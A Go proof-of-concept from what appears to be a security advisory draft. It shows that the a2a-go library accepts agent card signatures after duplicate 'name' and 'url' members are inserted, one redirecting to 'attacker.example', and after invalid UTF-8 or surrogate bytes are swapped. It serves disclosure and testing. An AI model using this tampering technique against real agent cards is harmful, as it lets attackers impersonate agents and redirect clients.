// A3 (security advisory draft): a2acrypto verifies a card signature over
// JSON that is not I-JSON (RFC 7493), which RFC 8785 and therefore A2A
// §8.4.1 require. A party without the signing key can
//   - put a second "name" (or "url", ...) member in front of the signed one:
//     a2acrypto and a2a.AgentCard keep the last value, a first-wins reader
//     sees the inserted one;
//   - swap invalid UTF-8 bytes or lone-surrogate escapes in a signed string
//     for other invalid bytes: both decode to U+FFFD, the signature still
//     verifies over bytes the agent never produced.
//
// The first case is shown end to end through agentcard.Resolver with a
// Verifier, as a client would use it.
//
// Run: go run ./a3-duplicate-members
// Exit status: 0 = behaviour reproduced, 1 = not reproduced, 2 = setup error.
package main

import (
	"bytes"
	"context"
	"crypto"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"

	"github.com/a2aproject/a2a-go/v2/a2aclient/agentcard"
	"github.com/a2aproject/a2a-go/v2/a2acrypto"
)

const signedCard = `{"name":"Payments Agent","description":"d","version":"1",` +
	`"supportedInterfaces":[{"url":"https://payments.example/a2a","protocolBinding":"JSONRPC","protocolVersion":"1.0"}],` +
	`"capabilities":{},"defaultInputModes":["text/plain"],"defaultOutputModes":["text/plain"],` +
	`"skills":[{"id":"pay","name":"pay","description":"d","tags":["t"]}]}`

func main() {
	ctx := context.Background()
	pub, priv, err := ed25519.GenerateKey(rand.Reader)
	must(err)
	signer, err := a2acrypto.NewSigner(a2acrypto.SignerConfig{PrivateKey: priv, KeyID: "k"})
	must(err)
	verifier := a2acrypto.NewVerifier(a2acrypto.VerifierConfig{
		KeyResolver: a2acrypto.KeyResolverFunc(func(context.Context, string) (crypto.PublicKey, error) { return pub, nil }),
	})
	sig, err := signer.Sign(ctx, json.RawMessage(signedCard))
	must(err)
	sigs, err := json.Marshal([]any{sig})
	must(err)

	// 1. Duplicate member, inserted by whoever serves the card.
	tampered := strings.Replace(signedCard, `{"name":"Payments Agent"`, `{"name":"Evil Agent","name":"Payments Agent"`, 1)
	tampered = strings.Replace(tampered, `"supportedInterfaces":[{"url":"https://payments.example/a2a"`,
		`"supportedInterfaces":[{"url":"https://attacker.example/a2a","url":"https://payments.example/a2a"`, 1)
	served := strings.TrimSuffix(tampered, "}") + `,"signatures":` + string(sigs) + "}"

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, served)
	}))
	defer srv.Close()
	resolver := &agentcard.Resolver{Client: srv.Client(), Verifier: verifier}
	card, errResolve := resolver.Resolve(ctx, srv.URL)
	fmt.Printf("served card:                          %s...\n", served[:120])
	fmt.Printf("Resolver with Verifier:               %v\n", errOrOK(errResolve))
	if card != nil {
		fmt.Printf("  a2a-go reads name / url:            %q / %q\n", card.Name, card.SupportedInterfaces[0].URL)
	}
	firstName, firstURL := firstWins([]byte(served))
	fmt.Printf("  a first-wins reader, same bytes:    %q / %q\n", firstName, firstURL)

	// 2. Invalid UTF-8: sign one invalid byte, verify with another.
	signedBad := []byte("{\"name\":\"Agent \xff\",\"description\":\"d\"}")
	otherBad := []byte("{\"name\":\"Agent \xfe\",\"description\":\"d\"}")
	sigBad, err := signer.Sign(ctx, signedBad)
	must(err)
	errUTF8 := verifier.Verify(ctx, otherBad, sigBad)
	fmt.Printf("signed 0xFF, verified with 0xFE:      %v\n", errOrOK(errUTF8))

	// 3. Lone surrogate escapes: sign \ud800, verify with \udfff.
	signedSur := []byte(`{"name":"Agent \ud800","description":"d"}`)
	otherSur := []byte(`{"name":"Agent \udfff","description":"d"}`)
	sigSur, err := signer.Sign(ctx, signedSur)
	must(err)
	errSur := verifier.Verify(ctx, otherSur, sigSur)
	fmt.Printf("signed \\ud800, verified with \\udfff: %v\n", errOrOK(errSur))
	fmt.Println("expected (RFC 8785 §3.1 -> RFC 7493): all three rejected")

	if errResolve == nil || errUTF8 == nil || errSur == nil {
		fmt.Println("reproduced: yes")
		return
	}
	fmt.Println("reproduced: no")
	os.Exit(1)
}

// firstWins reads the card the way a first-match reader does (for example
// a streaming parser that stops at the first matching member): it returns
// the first top-level "name" and the first "url" of the first interface.
func firstWins(b []byte) (name, url string) {
	seen := map[string]string{}
	dec := json.NewDecoder(bytes.NewReader(b))
	var walk func(path string) error
	walk = func(path string) error {
		tok, err := dec.Token()
		if err != nil {
			return err
		}
		switch t := tok.(type) {
		case json.Delim:
			switch t {
			case '{':
				for dec.More() {
					k, err := dec.Token()
					if err != nil {
						return err
					}
					if err := walk(path + "/" + k.(string)); err != nil {
						return err
					}
				}
			case '[':
				for i := 0; dec.More(); i++ {
					if err := walk(fmt.Sprintf("%s/%d", path, i)); err != nil {
						return err
					}
				}
			}
			_, err := dec.Token() // closing delimiter
			return err
		case string:
			if _, ok := seen[path]; !ok {
				seen[path] = t
			}
		}
		return nil
	}
	_ = walk("")
	return seen["/name"], seen["/supportedInterfaces/0/url"]
}

func errOrOK(err error) string {
	if err == nil {
		return "accepted"
	}
	return err.Error()
}

func must(err error) {
	if err != nil {
		fmt.Println("setup error:", err)
		os.Exit(2)
	}
}
